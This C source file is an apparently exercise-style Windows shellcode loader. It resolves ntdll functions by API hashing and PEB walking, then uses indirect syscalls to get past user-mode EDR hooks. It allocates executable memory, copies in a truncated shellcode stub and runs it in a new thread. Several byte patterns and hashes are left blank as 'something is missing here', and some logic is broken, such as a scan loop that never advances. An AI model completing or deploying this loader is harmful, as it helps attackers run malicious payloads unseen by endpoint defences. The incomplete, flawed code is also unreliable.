#include <Windows.h>
#include <stdio.h>
#include <winternl.h>

// Might need adjustments depending on your compiler setup
#pragma comment(lib, "ntdll.lib")

#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)

DWORD calcHash(char* data) {
    DWORD hash = 0x99;
    for (int i = 0; i < strlen(data); i++) {
        hash += data[i] + (hash << 1);
    }
    return hash;
}

DWORD calcHashModule(LDR_MODULE* mdll) {
    char name[64];
    size_t i = 0;
    while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1) {
        name[i] = (char)mdll->dllname.Buffer[i];
        i++;
    }
    name[i] = '\0';
    return calcHash(CharLowerA(name));
}

// Function to get the base address of a module (dll) by hash
static HMODULE GetModule(DWORD myHash) {
    HMODULE module;
    INT_PTR peb = __readgsqword(0x60);
    int ldr = 0x18;
    int flink = 0x10;
    INT_PTR Mldr = *(INT_PTR*)(peb + ldr);
    INT_PTR M1flink = *(INT_PTR*)(Mldr + flink);
    LDR_MODULE* Mdl = (LDR_MODULE*)M1flink;
    do {
        Mdl = (LDR_MODULE*)Mdl->e[0].Flink;
        if (Mdl->base != NULL) {
            if (calcHashModule(Mdl) == myHash) {
                break;
            }
        }
    } while (M1flink != (INT_PTR)Mdl);
    module = (HMODULE)Mdl->base;
    return module;
}

// Function to get the address of a function by hash
static LPVOID GetFunctionAddr(HMODULE module, DWORD myHash) {
    PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((LPBYTE)module + DOSheader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY EXdir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)module + NTheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD fAddr = (PDWORD)((LPBYTE)module + EXdir->AddressOfFunctions);
    PDWORD fNames = (PDWORD)((LPBYTE)module + EXdir->AddressOfNames);
    PWORD fOrdinals = (PWORD)((LPBYTE)module + EXdir->AddressOfNameOrdinals);
    for (DWORD i = 0; i < EXdir->AddressOfFunctions; i++) {
        LPSTR pFuncName = (LPSTR)((LPBYTE)module + fNames[i]);
        if (calcHash(pFuncName) == myHash) {
            return (LPVOID)((LPBYTE)module + fAddr[fOrdinals[i]]);
        }
    }
    return NULL;
}


// Function to retrieve syscall number given an address.
WORD GetsyscallNum(LPVOID addr) {

    WORD SSN = NULL;

    while (TRUE) {
        // Check if the current bytes represent a syscall; if so, we've gone too far.
        if (*((PBYTE)addr) == 0x0f && *((PBYTE)addr + 1) == 0x05)
            return FALSE;
        // Check if the current byte is a return opcode; if so, we've gone too far.
        if (*((PBYTE)addr) == 0xc3)
            return FALSE;
        // Check if the current bytes match the pattern from an unhooked clean syscall stub from a native function e.g. NtAllocateVirtualMemory; if so, return the syscall number.
        if (*((PBYTE)addr) == 0x4c
            && *((PBYTE)addr + 1) == 0x8b
            && *((PBYTE)addr + 2) == // something is missing here
            && *((PBYTE)addr + 3) == // something is missing here
            && *((PBYTE)addr + 6) == // something is missing here
            && *((PBYTE)addr + 7) == 0x00) {

            BYTE high = *((PBYTE)addr + 5);
            BYTE low = *((PBYTE)addr + 4);
            SSN = (high << 8) | low;

            return SSN;
        }
    }
}

// Function to retrieve address of syscall instruction given an address.
INT_PTR GetsyscallInstr(LPVOID addr) {
    // Check if the current bytes match the pattern from an unhooked clean syscall stub from a native function e.g. NtAllocateVirtualMemory; if so, return the syscall number.
    if (*((PBYTE)addr) == 0x4c
        && *((PBYTE)addr + 1) == 0x8b
        && *((PBYTE)addr + 2) == // something is missing here
        && *((PBYTE)addr + 3) == // something is missing here
        && *((PBYTE)addr + 6) == // something is missing here
        && *((PBYTE)addr + 7) == 0x00) {

        return (INT_PTR)addr + 0x12;    // Address of syscall instruction
    }
}




//--------------------------------------------------------------------------------------------------------------------------------


int main() {
    // Define shellcode to be injected.
    const char shellcode[] = "\xfc\x48\x83...";


    
    LPVOID addr = NULL; // Address of the function in ntdll.dll
    DWORD syscallNum = NULL; // Syscall number
    INT_PTR syscallAddr = NULL; // Address of the syscall instruction

    // Retrieve handle to ntdll.dll
    HMODULE ntdll = GetModule(4097367);

    //--------------------------------------------------------------------------------------------------------------------------------

    PVOID BaseAddress = NULL; // Base address for the shellcode
    SIZE_T RegionSize = sizeof(shellcode); // Size of the shellcode region

    addr = GetFunctionAddr(ntdll, 18887768681269);     // Retrieve the address of the function within ntdll.dll that corresponds to the hash 8454456120 (NtAllocateVirtualMemory)
    syscallNum = GetsyscallNum(addr);				  // Based on the address of the function, use the GetSyscallNum function to get the S  
    syscallAddr = GetsyscallInstr(addr);		     // Now that we have the address of the function, we can find out what the address of the syscall instruction is.

    PrepareSSN(syscallNum);							// Call the external defined function PrepareSSN defined in syscalls.h to store the SSN and then pass it to the MASM code. 
    PrepareSyscallInst(syscallAddr);               // Call the external defined function PrepareSyscallInst defined in syscalls.h to store the address of the syscall instruction and then pass it to the MASM code.

    // Allocate memory for the shellcode
    NtAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    //--------------------------------------------------------------------------------------------------------------------------------


    // Copy the shellcode into the allocated memory region
    memcpy(BaseAddress, shellcode, sizeof(shellcode));

    //--------------------------------------------------------------------------------------------------------------------------------


    HANDLE hThread; // Handle to the newly created thread
    DWORD OldProtect = NULL; // Previous protection level of the memory region

    // Retrieve the address of NtProtectVirtualMemory in ntdll.dll
    addr = GetFunctionAddr(ntdll, /*something is missing here*/);
    syscallNum = GetsyscallNum(addr);
    syscallAddr = GetsyscallInstr(addr);
    PrepareSSN(syscallNum);
    PrepareSyscallInst(syscallAddr);

    // Change the protection level of the memory region to PAGE_EXECUTE_READWRITE
    NtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, &RegionSize, PAGE_EXECUTE_READ, &OldProtect);


    //--------------------------------------------------------------------------------------------------------------------------------

    HANDLE hHostThread = INVALID_HANDLE_VALUE; // Handle to the host thread

    // Retrieve the address of NtCreateThreadEx in ntdll.dll
    addr = GetFunctionAddr(ntdll, /*something is missing here*/);
    syscallNum = GetsyscallNum(addr);
    syscallAddr = GetsyscallInstr(addr);
    PrepareSSN(syscallNum);
    PrepareSyscallInst(syscallAddr);
    NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);


    //--------------------------------------------------------------------------------------------------------------------------------

    // Retrieve the address of NtWaitForSingleObject in ntdll.dll
    addr = GetFunctionAddr(ntdll, /*something is missing here*/);
    syscallNum = GetsyscallNum(addr);
    syscallAddr = GetsyscallInstr(addr);
    PrepareSSN(syscallNum);
    PrepareSyscallInst(syscallAddr);
    NtWaitForSingleObject(hThread, FALSE, NULL);

    return 0;
}
